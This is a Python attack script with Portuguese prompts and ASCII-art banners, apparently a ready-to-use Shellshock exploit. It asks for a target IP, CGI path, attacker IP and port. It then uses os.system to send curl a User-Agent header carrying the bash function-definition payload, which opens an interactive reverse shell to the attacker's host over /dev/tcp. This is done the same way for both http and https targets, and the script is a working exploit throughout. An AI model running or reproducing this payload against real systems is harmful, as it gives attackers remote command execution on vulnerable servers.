#!/usr/bin/env python3 



import sys 
import requests
import socket
import time 
import os

AZUL= '\033[94m'
VERDE= '\033[92m'
AMARELO= '\033[93m'
VERMELHO= '\033[91m'

a=AZUL; v=VERDE; am=AMARELO; ver=VERMELHO;


def exploit():
    print('''
     \ \        / / | |                                     
  \ \  /\  / /__| | ___ ___  _ __ ___   ___             
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \            
  _ \  /\  /  __/ | (_| (_) | | | | | |  __/            
 | | \/  \/ \___|_|\___\___/|_| |_| |_|\___|            
 | |_ ___                                               
 | __/ _ \                                              
 | || (_) |                                             
  \__\___/                                              
  _   _                                                 
 | | | |                                                
 | |_| |__   ___                                        
 | __| '_ \ / _ \                                       
 | |_| | | |  __/                                       
  \__|_| |_|\___|                                       
   _____                                 _              
  / ____|                               (_)             
 | |     __ _ _ __  _ __  _   _  ___ ___ _ _ __   ___   
 | |    / _` | '_ \| '_ \| | | |/ __/ __| | '_ \ / _ \  
 | |___| (_| | |_) | |_) | |_| | (_| (__| | | | | (_) | 
  \_____\__,_| .__/| .__/ \__,_|\___\___|_|_| |_|\___/  
    ''')
    time.sleep(0.5)
    pergunta=input(f"{a}https ou http ? \n>> {a}")
    if pergunta == 'https':
        exploit_https()
    elif pergunta == 'http':
        exploit_http()
    else:
        print(f"{a}80/443 ? {a}")
        exploit()

def exploit_http():
    print('''
  .-~~-.
,|`-__-'|
||      |
`|      |  Dobro Expresso para nao dormir <3 
  `-__-'
     -
''')
    time.sleep(0.5)
    ip = input(f"{v}ip aqui: {v}")
    cgi = input(f"{v}cgi aqui: {v}")
    meu_ip = input(f"{v}Seu ip: {v}")
    porta = input(f"{v}Porta: {v}")
    http='http://'
    resposta=http + ip + cgi
    requisicao=requests.get(resposta)
    print(requisicao.status_code)
    cmd=('curl ' + f'{resposta}' ' -A "() { :;}; echo Content-type: text/html; echo; /bin/bash -i >& /dev/tcp/' f'{meu_ip}''/'f'{porta} 0>&1;"')
    print(f"{a}Tentando conexão{a}")
    time.sleep(0.3)
    resultado = os.system(cmd)
    print(f"{ver}Desconectado !{ver}")
    time.sleep(0.5)
    print(f"{ver}Script by: Exodus(Silva) && Mug93r{ver}")



def exploit_https():
    ('''         {
      {   }
       }_{ __{
    .-{   }   }-.
   (   }     {   )
   |`-.._____..-'|
   |             ;--.
   |            (__  \ 
   |             | )  )
   |             |/  /
   |             /  /   
   |            (  /
   \             y'
    `-.._____..-'
''' )
    time.sleep(0.5)
    ip = input(f"{v}ip aqui: {v}")
    cgi = input(f"{v}cgi aqui: {v}")
    meu_ip = input(f"{v}Seu ip: {v}")
    porta = input(f"{v}Porta: {v}")
    http='https://'
    resposta=http + ip + cgi
    requisicao=requests.get(resposta)
    print(requisicao.status_code)
    cmd=('curl ' + f'{resposta}' ' -A "() { :;}; echo Content-type: text/html; echo; /bin/bash -i >& /dev/tcp/' f'{meu_ip}''/'f'{porta} 0>&1;"')
    print(f"{a}Tentando conexão{a}")
    time.sleep(0.3)
    resultado = os.system(cmd)
    print(f"{ver}Desconectado !{ver}")
    time.sleep(0.5)
    print(f"{ver}Script by: Exodus(Silva) && Mug93r{ver}")



exploit()
